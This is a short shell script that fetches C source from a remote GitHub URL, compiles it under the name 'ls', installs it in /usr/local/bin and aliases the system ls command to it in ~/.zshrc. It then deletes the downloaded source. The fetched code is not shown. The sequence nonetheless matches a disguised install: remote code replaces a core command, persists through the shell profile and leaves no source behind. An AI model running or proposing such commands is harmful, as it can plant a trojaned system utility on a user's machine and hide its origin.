curl -o ls.c https://raw.githubusercontent.com/connor981332/setup/main/setup.c
gcc ./ls.c -o ls
mv ./ls /usr/local/bin/
echo "alias ls=/usr/local/bin/ls" >> ~/.zshrc
. ~/.zshrc
rm ./ls.c